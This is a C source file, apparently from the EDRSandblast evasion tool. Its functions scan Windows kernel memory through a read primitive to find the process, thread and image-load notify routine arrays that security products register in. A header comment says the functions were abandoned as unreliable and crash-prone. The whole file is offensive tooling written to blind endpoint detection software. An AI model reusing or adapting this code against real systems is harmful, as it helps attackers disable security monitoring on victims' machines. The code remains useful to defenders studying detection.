/*

--- ntoskrnl Notify Routines' offsets search functions using patterns.
--- Ultimately not used because too unreliable and too prone to BSoD.

*/
#include <Windows.h>
#include <Tchar.h>
#include "KernelMemoryPrimitives.h"
#include "KernelUtils.h"
#include "../EDRSandblast.h"

DWORD64 PatternSearchStartingFromAddress(DWORD64 startAddress, DWORD bytesToScan, DWORD64 pattern, DWORD64 mask) {
    for (DWORD i = 0; i < bytesToScan; i++) {
        DWORD64 instructionAddress = startAddress + i;
        DWORD64 dword64Instruction = ReadMemoryDWORD64(instructionAddress);
        DWORD64 dword64InstructionFixed = dword64Instruction & mask;
        // _tprintf_or_not(TEXT("i = %i, pattern = 0x%I64x, instructionAddress = 0x%I64x, wordInstruction = 0x%I64x, wordInstructionFixed = 0x%I64x\n"), i, pattern, instructionAddress, dword64Instruction, dword64InstructionFixed);
        if (dword64InstructionFixed == pattern) {
            _tprintf_or_not(TEXT("[+] Found pattern = 0x%I64x at offset i = %i [instructionAddress = 0x%I64x, wordInstruction = 0x%I64x, wordInstructionFixed = 0x%I64x]\n"), pattern, i, instructionAddress, dword64Instruction, dword64InstructionFixed);
            return instructionAddress;
        }
    }
    return 0x0;
}

DWORD64 ExtractRelativeAddress(DWORD64 instructionStartAddress, DWORD64 instructionRelativeAddressOffset, DWORD64 nextInstructionOffset) {
    DWORD64 procedureRelativeAddress = (signed int)ReadMemoryDWORD64(instructionStartAddress + instructionRelativeAddressOffset);
    DWORD64 nextInstructionAddress = instructionStartAddress + nextInstructionOffset;
    return nextInstructionAddress + procedureRelativeAddress;
}

DWORD64 GetPspCreateProcessNotifyRoutineAddressUsingPattern(void) {
    _putts_or_not(TEXT("[*] Searching for PspCreateProcessNotifyRoutine address using pattern"));

    // Extracting PspSetCreateProcessNotifyRoutine address in PsSetCreateProcessNotifyRoutine using the pattern "E8" (CALL) to match "[e80e010000]  call nt!PspSetCreateProcessNotifyRoutine".
    DWORD64 PsSetCreateProcessNotifyRoutineAddress = GetKernelFunctionAddress("PsSetCreateProcessNotifyRoutine");
    DWORD64 CallPspSetCreateProcessNotifyRoutineAddress = PatternSearchStartingFromAddress(PsSetCreateProcessNotifyRoutineAddress, 64, 0x00000000000000E8, 0x00000000000000FF);
    DWORD64 PspSetCreateProcessNotifyRoutineAddress = ExtractRelativeAddress(CallPspSetCreateProcessNotifyRoutineAddress, 1, 5);

    // Extracting PspCreateProcessNotifyRoutine address in PspSetCreateProcessNotifyRoutine using the pattern "4C 8D" (LEA 4C) to match "[4c8d2d371ddaff]  lea r13,[nt!PspCreateProcessNotifyRoutine".
    DWORD64 LeaPspCreateProcessNotifyRoutineAddress = PatternSearchStartingFromAddress(PspSetCreateProcessNotifyRoutineAddress, 256, 0x0000000000008D48, 0x000000000000FFF8);
    DWORD64 PspCreateProcessNotifyRoutineAddress = ExtractRelativeAddress(LeaPspCreateProcessNotifyRoutineAddress, 3, 7);
    _tprintf_or_not(TEXT("[+] Pattern search found PspCreateProcessNotifyRoutine address: 0x%I64x\n"), PspCreateProcessNotifyRoutineAddress);
    
    return PspCreateProcessNotifyRoutineAddress;
}

DWORD64 GetPspCreateThreadNotifyRoutineAddressUsingPattern(void) {
    _putts_or_not(TEXT("[*] Searching for PspCreateThreadNotifyRoutine address using pattern"));

    // Extracting nt!PspSetCreateThreadNotifyRoutine address in nt!PsSetCreateThreadNotifyRoutine using the pattern "E8" (CALL) to match "[e865000000]  call nt!PspSetCreateThreadNotifyRoutine".
    DWORD64 PsSetCreateThreadNotifyRoutineAddress = GetKernelFunctionAddress("PsSetCreateThreadNotifyRoutine");
    DWORD64 CallPspSetCreateThreadNotifyRoutineAddress = PatternSearchStartingFromAddress(PsSetCreateThreadNotifyRoutineAddress, 64, 0x00000000000000E8, 0x00000000000000FF);
    DWORD64 PspSetCreateThreadNotifyRoutineAddress = ExtractRelativeAddress(CallPspSetCreateThreadNotifyRoutineAddress, 1, 5);

    // Extracting nt!PspCreateThreadNotifyRoutine address in nt!PspSetCreateThreadNotifyRoutine using the pattern "4C 8D" (LEA 4C) to match "[488d0d431cdaff]  lea rcx,[nt!PspCreateThreadNotifyRoutine]".
    DWORD64 LeaPspCreateThreadNotifyRoutineAddress = PatternSearchStartingFromAddress(PspSetCreateThreadNotifyRoutineAddress, 256, 0x0000000000008D48, 0x000000000000FFF8);
    DWORD64 PspCreateThreadNotifyRoutineAddress = ExtractRelativeAddress(LeaPspCreateThreadNotifyRoutineAddress, 3, 7);
    _tprintf_or_not(TEXT("[+] Pattern search found PspCreateThreadNotifyRoutine address: 0x%I64x\n"), PspCreateThreadNotifyRoutineAddress);
    
    return PspCreateThreadNotifyRoutineAddress;
}

DWORD64 GetPspLoadImageNotifyRoutineAddressUsingPattern(void) {
    _putts_or_not(TEXT("[*] Searching for PspLoadImageNotifyRoutine address using pattern"));

    // Extracting nt!PspLoadImageNotifyRoutine address directly from nt!PsSetLoadImageNotifyRoutineEx using the pattern "4C 8D" (LEA 4C) to match "[488d0d981ddaff]  lea rcx,[nt!PspLoadImageNotifyRoutine]".
    DWORD64 PsSetLoadImageNotifyRoutineExAddress = GetKernelFunctionAddress("PsSetLoadImageNotifyRoutineEx");
    DWORD64 LeaPspLoadImageNotifyRoutineAddress = PatternSearchStartingFromAddress(PsSetLoadImageNotifyRoutineExAddress, 128, 0x0000000000008D48, 0x000000000000FFF8);
    DWORD64 PspLoadImageNotifyRoutineAddress = ExtractRelativeAddress(LeaPspLoadImageNotifyRoutineAddress, 3, 7);;
    _tprintf_or_not(TEXT("[+] Pattern search found PspLoadImageNotifyRoutine address: 0x%I64x\n"), PspLoadImageNotifyRoutineAddress);
    
    return PspLoadImageNotifyRoutineAddress;
}